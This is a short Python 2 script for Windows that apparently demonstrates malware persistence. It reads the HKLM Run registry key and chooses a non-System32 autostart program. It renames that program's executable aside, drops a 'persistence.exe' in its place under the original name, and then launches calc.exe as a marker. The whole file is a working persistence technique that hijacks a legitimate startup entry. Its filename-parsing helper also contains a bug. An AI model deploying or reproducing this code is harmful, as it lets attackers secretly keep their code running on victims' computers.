from _winreg import *
import shutil
import os
import subprocess

def isSystemProtected(str):
	if "System32" in str:
		return True
	return False

def getFileName(str):
	i = len(str)-1
	while i >= 0:
		if (str[i] == "\\"):
			break
		i-=1
	i+=1
	j = i
	
	while (j < len(str)-4):
		if(str[j:j+3] == ".exe"):
			break
		j+=1
	j += 4
	new_string = str[i:j]
	return new_string, i
	
print os.path.basename(__file__)

aReg = ConnectRegistry(None,HKEY_LOCAL_MACHINE)
aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run") 
lista = []
for i in range(1024):                                           
    try:
        n,v,t = EnumValue(aKey,i)
        lista.append(v)
        #print n, v
		
    except EnvironmentError:
        break          
CloseKey(aKey)


persistence_path = "Nowhere"
for i in range(len(lista)): 
	if(isSystemProtected(lista[len(lista)-1-i]) == False):
		persistence_path = lista[len(lista)-1-i]

persistence_name, i = getFileName(persistence_path)
print "Setting persistence in \n" + persistence_path[0:i] + "with name:\n" + persistence_name

os.rename(persistence_path[0:i]+persistence_name,persistence_path[0:i]+persistence_name[0:len(persistence_name)-4]+"_.exe")
shutil.copy("persistence.exe",persistence_path[0:i])
os.rename(persistence_path[0:i]+"persistence.exe",persistence_path[0:i]+persistence_name)
subprocess.call(['calc.exe'])